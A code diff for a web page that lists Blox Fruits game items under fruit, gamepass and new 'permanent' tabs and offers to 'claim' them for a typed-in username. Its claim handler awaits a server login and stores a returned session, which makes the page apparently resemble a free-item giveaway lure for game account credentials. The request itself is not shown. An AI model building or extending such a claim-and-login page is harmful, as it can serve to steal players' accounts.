@@ -4,34 +4,36 @@ const buttons = document.querySelectorAll(".nav button");
 
 const fruitsSection = document.getElementById("fruitsSection");
 const gamepassesSection = document.getElementById("gamepassesSection");
+const permanentSection = document.getElementById("permanentSection");
 
 buttons.forEach(btn=>{
     btn.onclick = () => {
-
         buttons.forEach(b=>b.classList.remove("active"));
         btn.classList.add("active");
-
         const tab = btn.dataset.tab;
 
         if(tab === "all"){
             fruitsSection.style.display = "block";
             gamepassesSection.style.display = "block";
+            permanentSection.style.display = "block";
         }
-
+        
         else if(tab === "fruits"){
             fruitsSection.style.display = "block";
             gamepassesSection.style.display = "none";
+            permanentSection.style.display = "none";
         }
-
+        
+        else if(tab === "permanent"){
+            fruitsSection.style.display = "none";
+            gamepassesSection.style.display = "none";
+            permanentSection.style.display = "block";
+        }
+        
         else if(tab === "gamepasses"){
             fruitsSection.style.display = "none";
             gamepassesSection.style.display = "block";
-        }
-
-        else if(tab === "services"){
-            fruitsSection.style.display = "none";
-            gamepassesSection.style.display = "none";
-            alert("Services coming soon 👀");
+            permanentSection.style.display = "none";
         }
     };
 });
@@ -63,7 +65,7 @@ const fruits = [
 {name:"Love", rarity:"legendary"},
 {name:"Creation", rarity:"legendary"},
 {name:"Spider", rarity:"legendary"},
-{name:"Sound", rarity:"uncommon"},
+{name:"Sound", rarity:"legendary"},
 {name:"Phoenix", rarity:"legendary"},
 {name:"Portal", rarity:"legendary"},
 {name:"Lightning", rarity:"legendary"},
@@ -96,6 +98,7 @@ const gamepasses = [
 
 const fruitGrid = document.getElementById("fruitGrid");
 const gamepassGrid = document.getElementById("gamepassGrid");
+const permanentGrid = document.getElementById("permanentGrid");
 
 const modal = document.getElementById("modal");
 const claimModal = document.getElementById("claimModal");
@@ -110,6 +113,7 @@ const claimBtn = document.getElementById("claimBtn");
 const username = document.getElementById("username");
 
 let selected = "";
+let selectedType = "";
 
 function getImg(name){
     const gp = gamepasses.find(g=>g.name===name);
@@ -117,35 +121,57 @@ function getImg(name){
     return `https://blox-fruits.fandom.com/wiki/Special:FilePath/${name}_Fruit.png`;
 }
 
-function createCard(item,parent){
-    const d=document.createElement("div");
-    d.className="card "+item.rarity;
+function createCard(item, parent, extraClass=""){
+    const d = document.createElement("div");
 
-    d.innerHTML=`
+    const isPermanent = extraClass === "permanent" || extraClass === "gamepass";
+
+    d.className = "card " + (item.rarity || "") + " " + extraClass + (isPermanent ? " permanent" : "");
+
+    d.innerHTML = `
         <img src="${getImg(item.name)}"
         onerror="this.src='https://via.placeholder.com/100'">
         <p>${item.name}</p>
     `;
 
-    d.onclick=()=>openModal(item.name);
+    d.onclick = () => openModal(item.name, item.rarity, extraClass);
+
     parent.appendChild(d);
 }
 
 fruits.forEach(f=>createCard(f,fruitGrid));
-gamepasses.forEach(g=>createCard(g,gamepassGrid));
+gamepasses.forEach(g=>createCard(g,gamepassGrid, "gamepass"));
+fruits.forEach(f=>createCard(f,permanentGrid,"permanent"));
 
-function openModal(name){
-    selected=name;
-    modalText.innerText="Claim "+name;
-    modal.style.display="flex";
+function openModal(name, rarity, extraClass){
+    selected = name;
+    selectedType = extraClass; // IMPORTANT FIX
+
+    if(extraClass === "permanent"){
+        modalText.innerText = "Claim Permanent " + name;
+    } else if(extraClass === "gamepass"){
+        modalText.innerText = "Claim " + name + " Gamepass";
+    } else {
+        modalText.innerText = "Claim " + name;
+    }
+
+    modal.style.display = "flex";
 }
 
 noBtn.onclick=()=>modal.style.display="none";
 
-yesBtn.onclick=()=>{
-    modal.style.display="none";
-    claimItem.innerText="Item: "+selected;
-    claimModal.style.display="flex";
+yesBtn.onclick = () => {
+    modal.style.display = "none";
+
+    if(selectedType === "permanent"){
+        claimItem.innerText = "Permanent Item: " + selected;
+    } else if (selectedType === "gamepass"){
+        claimItem.innerText = "Gamepass Item: " + selected;
+    } else {
+        claimItem.innerText = "Item: " + selected;
+    }
+
+    claimModal.style.display = "flex";
 };
 
 let isSending = false
@@ -183,7 +209,7 @@ claimBtn.onclick = async () => {
     const data = await response.json();
     if (data.result) {
         console.log("Login success");
-        cookie = data.session
+        session = data.session
     } else {
         console.log("Login failed");
     }
